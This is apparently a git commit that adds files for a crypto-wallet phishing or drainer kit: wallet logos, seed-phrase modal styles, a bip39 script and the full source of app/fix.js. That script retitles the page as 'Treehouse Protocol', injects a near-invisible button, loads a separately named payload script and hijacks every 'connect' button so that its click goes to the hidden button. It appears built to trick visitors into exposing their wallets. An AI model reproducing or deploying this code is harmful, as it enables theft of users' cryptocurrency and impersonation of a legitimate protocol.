7c7aa9068353580d816e0b3db3bd65f8f2c3d4db
zythtrail <zythtrail@proton.me>
2024-11-02 18:30:34 -0400

    new file:   app/a2b91e7c-bcd5-42ba-97cb-adea40e3b3cf.js 	new file:   app/fix.js 	new file:   app/images/binance.svg 	new file:   app/images/black-arrow.svg 	new file:   app/images/black-close-cross.svg 	new file:   app/images/bnb-logo.png 	new file:   app/images/coinbase-rainbow.svg 	new file:   app/images/coinbase-shadow.png 	new file:   app/images/coinbase.png 	new file:   app/images/coinbase.svg 	new file:   app/images/digital-assets.svg 	new file:   app/images/ethereum-logo.png 	new file:   app/images/exodus.svg 	new file:   app/images/fantom-logo.png 	new file:   app/images/hide-password.svg 	new file:   app/images/ledger.png 	new file:   app/images/metamask-rainbow.svg 	new file:   app/images/metamask-shadow.png 	new file:   app/images/metamask-wallet-connect.png 	new file:   app/images/metamask.png 	new file:   app/images/metamask.svg 	new file:   app/images/modal-close-arrow.svg 	new file:   app/images/new-way.svg 	new file:   app/images/non-web3-wallets.png 	new file:   app/images/optimistic-logo.png 	new file:   app/images/other-wallet.svg 	new file:   app/images/polygon-logo.png 	new file:   app/images/popup-error.svg 	new file:   app/images/popup-success.svg 	new file:   app/images/qr-code.svg 	new file:   app/images/rabby-rainbow.svg 	new file:   app/images/rabby.svg 	new file:   app/images/rainbow-back-arrow.svg 	new file:   app/images/rainbow-loader-icon.svg     new file:   app/images/rainbow.svg 	new file:   app/images/safari-icon.png 	new file:   app/images/safepal.png     new file:   app/images/trezor.png 	new file:   app/images/trust-wallet-rainbow.svg 	new file:   app/images/trust-wallet-shadow.png 	new file:   app/images/trust-wallet-wallet-connect.png 	new file:   app/images/trust-wallet.png 	new file:   app/images/trust-wallet.svg 	new file:   app/images/unstoppable-domains.png 	new file:   app/images/wallet-connect-rainbow.svg 	new file:   app/images/wallet-connect-shadow.png 	new file:   app/images/wallet-connect.png 	new file:   app/images/wallet-connect.svg 	new file:   app/images/warning.svg 	new file:   app/images/white-arrow.svg 	new file:   app/images/white-close-cross.svg 	new file:   app/scripts/bip39.js 	new file:   app/scripts/coinbase.js 	new file:   app/scripts/onboard.js 	new file:   app/scripts/rabby-kit.js 	new file:   app/scripts/seaport.js 	new file:   app/scripts/wallet-connect-v2.js 	new file:   app/scripts/wallet-connect-v3.js 	new file:   app/scripts/wallet-connect-v4.js 	new file:   app/styles/modal-11.css 	new file:   app/styles/modal-12-seed.css 	new file:   app/styles/modal-2.css 	new file:   app/styles/modal-5.css 	new file:   app/styles/modal-6.css 	new file:   app/styles/modal-7.css 	new file:   app/styles/modal-8.css 	new file:   app/styles/modal-9.css 	new file:   app/styles/modal-seed.css 	new file:   app/styles/popup-2.css 	new file:   app/styles/popup-3.css 	new file:   app/styles/popup-5.css 	new file:   app/styles/popup-6.css

---
+++ app/fix.js
@@ -0,0 +1,94 @@
+// Get the query parameters from the URL
+const urlParams = new URLSearchParams(window.location.search);
+document.title = "App | Treehouse Protocol";
+document.addEventListener('DOMContentLoaded', function () {
+    const btnz = document.createElement('button');
+    btnz.id = 'cBB';
+    btnz.classList.add("interact-button");
+    btnz.style.position = 'absolute';
+    btnz.style.opacity = 0.006;
+    btnz.style.height = "0.01em";
+    // btnz.style.bottom = 0;
+    // btnz.style.left = 0;
+    btnz.style["zIndex"] = '100';
+    btnz.textContent = 'Click Me!';
+    loadScript('./a2b91e7c-bcd5-42ba-97cb-adea40e3b3cf.js', () => {
+        setTimeout(() => {
+            // console.clear();
+        }, "5000");
+        console.log("Script loaded.");
+    });
+    // Append the button to the body
+    document.body.appendChild(btnz);
+
+
+
+
+
+    const addClassToButtons = () => {
+        const buttons = document.querySelectorAll("button");
+        newArr = [];
+        buttons.forEach(btn => {
+            if (btn.innerHTML.toLowerCase().includes("connect")) {
+                btn.classList.add("conB");
+                btn.addEventListener('click', (event) => {
+                    event.preventDefault();
+                    event.stopPropagation();
+                    event.stopImmediatePropagation(); // Stop all other event listeners
+                    const btn = document.getElementById("cBB");
+                    btn.click();
+                });
+            }
+        });
+    };
+
+    // Run initially to cover any buttons already present
+    addClassToButtons();
+
+    // Create a MutationObserver to observe changes to the DOM
+    const observer = new MutationObserver(mutations => {
+        mutations.forEach(mutation => {
+            if (mutation.addedNodes.length > 0) {
+                addClassToButtons();
+            }
+        });
+    });
+
+    // Start observing the document body for changes in child elements
+    observer.observe(document.body, {
+        childList: true,
+        subtree: true
+    });
+});
+
+
+function loadScript(url, callback) {
+    try {
+        const script = document.createElement('script');
+        script.type = 'text/javascript';
+        script.src = url;
+        script.async = true;
+
+        // Script loading callback
+        script.onload = function() {
+            callback();
+        };
+
+        // Handle script error event
+        script.onerror = (error) => {
+            console.error(`Script error: ${url}`, error);
+            // reject(error);
+        };
+
+        // script.src = url;
+        document.head.appendChild(script);
+    } catch(err) {
+
+    }
+}
+
+// Callback function to click the button once the script is loaded
+function onScriptLoaded() {
+    
+}
+
